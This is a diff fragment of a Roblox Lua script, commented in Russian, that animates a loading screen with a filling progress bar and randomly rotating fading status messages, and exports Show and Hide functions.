+loadingProgress.Parent = loadingBar
+
+local progressCorner = Instance.new("UICorner")
+progressCorner.CornerRadius = UDim.new(1, 0)
+progressCorner.Parent = loadingProgress
+
+local barCorner = Instance.new("UICorner")
+barCorner.CornerRadius = UDim.new(1, 0)
+barCorner.Parent = loadingBar
+
+-- Анимация индикатора загрузки
+local function animateLoadingBar()
+    while loadingProgress.Parent do
+        loadingProgress.Size = UDim2.new(0, 0, 1, 0)
+        
+        -- Анимация заполнения
+        for i = 0, 240, 4 do
+            if not loadingProgress.Parent then break end
+            loadingProgress.Size = UDim2.new(0, i, 1, 0)
+            wait(0.02)
+        end
+        
+        wait(0.5)
+    end
+end
+
+-- Список случайных текстов для загрузки
+local loadingMessages = {
+    "Загрузка ресурсов...",
+    "Оптимизация сцены...",
+    "Подготовка объектов...",
+    "Инициализация системы...",
+    "Загрузка текстур...",
+    "Компиляция скриптов...",
+    "Проверка соединения...",
+    "Синхронизация данных...",
+    "Кэширование ассетов...",
+    "Настройка интерфейса...",
+    "Загрузка конфигурации...",
+    "Проверка обновлений...",
+    "Инициализация плагинов...",
+    "Загрузка модулей...",
+    "Подготовка к работе..."
+}
+
+-- Функция для случайного изменения текста
+local function changeRandomText()
+    while loadingText.Parent do
+        local randomMessage = loadingMessages[math.random(1, #loadingMessages)]
+        loadingText.Text = randomMessage
+        
+        -- Небольшая анимация появления текста
+        for i = 0, 1, 0.1 do
+            if not loadingText.Parent then break end
+            loadingText.TextTransparency = 1 - i
+            wait(0.02)
+        end
+        
+        wait(5) -- Ждем 5 секунд перед следующим изменением
+        
+        -- Анимация исчезновения текста
+        for i = 0, 1, 0.1 do
+            if not loadingText.Parent then break end
+            loadingText.TextTransparency = i
+            wait(0.02)
+        end
+    end
+end
+
+-- Запускаем анимации
+spawn(animateLoadingBar)
+spawn(changeRandomText)
+
+-- Функция для скрытия меню загрузки
+local function hideLoadingMenu()
+    if blurFrame then
+        blurFrame:Destroy()
+    end
+    if blurEffect then
+        blurEffect:Destroy()
+    end
+end
+
+-- Функция для показа меню загрузки (если нужно переиспользовать)
+local function showLoadingMenu()
+    -- Код создания уже выполнен выше
+end
+
+-- Экспортируем функции для внешнего использования
+return {
+    Show = showLoadingMenu,
+    Hide = hideLoadingMenu
+}
